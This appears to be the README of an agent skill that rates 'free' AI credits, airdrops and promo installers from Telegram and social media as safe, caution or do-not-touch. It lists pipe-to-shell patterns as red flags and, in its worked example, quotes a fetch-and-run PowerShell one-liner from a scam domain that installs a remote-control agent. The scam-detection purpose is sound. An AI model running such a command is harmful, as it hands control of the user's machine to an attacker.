# bansos-check

[![License: MIT](https://img.shields.io/badge/license-MIT-16a34a.svg)](LICENSE)
[![Agent Skill](https://img.shields.io/badge/Agent%20Skill-cross--agent-7c3aed)](https://skills.sh/)

**bansos-check** is an agent skill that evaluates "free stuff" offers — free AI credits, giveaway subscriptions, airdrops, promo installers, and free API keys — shared via Telegram and social media, and returns an evidence-backed safety verdict: **AMAN** (safe), **HATI-HATI** (caution), or **JANGAN** (do not touch).

> Evaluation is read-only: an offer you must install, log into, or pay to unlock is not free — you are the product being collected.

## Install

```bash
npx skills add aryanibos/bansos-check
```

## How it works

1. Resolve the real destination domain and compare it against the official domain of the brand being invoked.
2. Classify what you are asked to do — a promo code entered on the official site, versus pipe-to-shell terminal commands (`irm ... | iex`, `curl ... | sh`), unknown installers or remote-control agents, logins on non-official domains, API key or seed phrase requests, or "activation fees".
3. Compare the offer's claim against the destination's own content.
4. Weigh pressure tactics such as countdowns, expiring slots, and "first 100 people" scarcity.
5. Corroborate with independent reporting and the brand's official channels.

## Verdicts

| Verdict | Meaning |
| --- | --- |
| AMAN | Safe — a genuine offer on an official path, nothing installed, logged into, or paid |
| HATI-HATI | Mixed signals — usable only in a limited way (e.g. browser-only, isolated environment) |
| JANGAN | Do not touch — pipe-to-shell installs, unknown agents, off-domain logins, key/seed requests, or unlock fees |

## Worked example

A Telegram post promised "free 30k Claude Opus credits" via superbot.gg. Reading the destination showed a third-party product whose Windows install was the pipe-to-shell one-liner `irm https://superbot.gg/bootstrap.ps1 | iex`, installing a remote-control agent — and the site sells its own tokens, not Anthropic credits. Claim ≠ reality. Verdict: **JANGAN**.

## License

MIT — see [LICENSE](LICENSE).
